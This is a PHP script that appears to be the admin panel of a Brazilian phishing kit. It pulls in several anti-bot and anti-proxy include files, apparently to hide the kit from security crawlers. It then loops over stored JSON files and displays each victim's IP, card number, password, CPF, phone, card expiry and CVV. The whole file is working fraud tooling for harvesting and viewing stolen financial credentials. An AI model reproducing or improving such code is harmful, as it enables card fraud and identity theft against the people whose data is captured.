<?php


require '../MagnumAntibot.php';
require '../MagnumAntibot2.php';
require '../MagnumAntibot3.php';
require '../MagnumAntibot4.php';
require '../MagnumAntibot5.php';
require '../MagnumAntibot6.php';
require '../MagnumAntibot7.php';
require '../MagnumAntibot8.php';
require "../antiproxy.php";
require "../bot.php";
require "../fucker.php";

$pasta_clientes = '../clientes/';

date_default_timezone_set('America/Sao_Paulo');

// Lista todos os arquivos na pasta clientes
$arquivos = glob($pasta_clientes . '*.json');

// Loop pelos arquivos
foreach ($arquivos as $arquivo) {
    // Lê o conteúdo do arquivo JSON
    $json_string = file_get_contents($arquivo);

    // Decodifica o JSON para um array associativo
    $dados_cliente = json_decode($json_string, true);

    // Verifica se a decodificação foi bem-sucedida
    if ($dados_cliente === null) {
        echo "Erro ao decodificar o arquivo JSON: $arquivo <br>";
    } else {
        // Exibe os dados do cliente
        echo "<h2>Dados do cliente no arquivo: $arquivo </h2>";
        echo "IP: " . $dados_cliente['ip'] . "<br>";
        echo "numeroc: " . $dados_cliente['numeroc'] . "<br>";
        echo "senhac: " . $dados_cliente['senhac'] . "<br>";
        echo "cpf: " . $dados_cliente['cpf'] . "<br>";
        echo "telefone: " . $dados_cliente['phone'] . "<br>";
        echo "validade: " . $dados_cliente['validade'] . "<br>";
        echo "cvv: " . $dados_cliente['cvv'] . "<br>";
        echo "data: " . $dados_cliente['data_acesso'] . "<br>";

// echo "Botao: <a href='operar/index.php?ip=" . $dados_cliente['ip'] . "'><button>Operar</button></a><br>";

        echo "<hr>";
         echo "<br><br><br>";
    }
}